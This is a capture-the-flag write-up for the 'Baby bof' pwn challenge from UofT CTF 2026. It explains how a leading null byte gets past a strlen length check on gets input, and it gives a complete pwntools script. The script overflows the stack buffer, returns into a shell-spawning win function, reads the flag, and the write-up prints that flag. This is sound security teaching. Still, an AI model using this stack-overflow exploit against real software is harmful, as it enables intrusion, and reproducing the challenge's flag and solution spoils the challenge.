# Baby bof - UofT CTF 2026

**Category:** Pwn  
**Points:** 41  
**Solves:** 262  
**Author:** White

## Description

> People said gets is not safe, but I think I figured out how to make it safe.
>
> `nc 34.48.173.44 5000`

## Analysis

### Binary Properties

```
$ checksec --file=chall
RELRO           STACK CANARY      NX            PIE             
Partial RELRO   No canary found   NX enabled    No PIE
```

Key observations:
- **No PIE**: Fixed addresses, making ROP straightforward
- **No Canary**: No stack protection to bypass
- **NX enabled**: Cannot execute shellcode on stack

### Disassembly

The `main` function contains:

```c
void main() {
    char buf[16];
    
    puts("What is your name: ");
    gets(buf);
    
    if (strlen(buf) > 14) {
        puts("Thats suspicious.");
        exit(1);
    }
    
    printf("Hi, %s!\n", buf);
}
```

There's also a `win` function at `0x4011f6`:

```c
void win() {
    system("/bin/sh");
}
```

### The Catch

The author "made gets safe" by adding a `strlen` check. If input exceeds 14 bytes, the program exits before returning from `main`, preventing the buffer overflow from triggering.

## Exploitation

### Bypassing strlen

The key insight is how `gets` and `strlen` handle null bytes differently:

| Function | Behavior with `\x00` |
|----------|---------------------|
| `gets()` | Reads until `\n`, ignores nulls |
| `strlen()` | Stops counting at first null |

By starting our payload with `\x00`, `strlen` returns 0, passing the check. Meanwhile, `gets` continues reading the full payload into the buffer.

### Payload Construction

```
Offset to return address = 16 (buffer) + 8 (saved RBP) = 24 bytes

Payload:
├── \x00              (1 byte)  - Bypass strlen
├── 'A' * 23          (23 bytes) - Padding to reach return address
├── 0x4012d4          (8 bytes) - ret gadget (stack alignment)
└── 0x4011f6          (8 bytes) - win function
```

### Solve Script

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")
context.binary = exe

def start():
    if args.REMOTE:
        return remote("34.48.173.44", 5000)
    else:
        return process([exe.path])

def main():
    io = start()

    offset = 24
    win_addr = 0x4011f6
    ret_gadget = 0x4012d4 # ret in main

    # Payload
    # Bypass strlen check (<= 14) by starting with null byte
    # gets() reads until newline, ignoring nulls
    payload = b"\x00" + b"A" * (offset - 1)
    payload += p64(ret_gadget) # Alignment
    payload += p64(win_addr)

    log.info(f"Sending payload: {len(payload)} bytes")
    io.sendline(payload)
    
    # Wait for shell to be ready
    time.sleep(1)
    
    io.sendline(b"cat flag.txt")
    print(io.recvline().decode(errors='ignore')) # Prompt
    print(io.recvline().decode(errors='ignore')) # Hi
    
    # Flag might take a moment or be mixed with prompt
    time.sleep(1)
    print(io.recv().decode(errors='ignore'))
    io.close()

if __name__ == "__main__":
    main()
```

### Execution

```
$ python3 solve.py REMOTE
[*] Sending payload: 40 bytes
What is your name: 
Hi, !
uoftctf{i7s_n0_surpris3_7h47_s7rl3n_s70ps_47_null}
```

## Flag

```
uoftctf{i7s_n0_surpris3_7h47_s7rl3n_s70ps_47_null}
```

## Takeaways

1. **Null byte bypass**: `strlen` stops at null bytes, but many input functions don't
2. **Stack alignment**: Modern glibc's `system()` requires 16-byte stack alignment
3. The flag confirms the intended solution: "strlen stops at null"
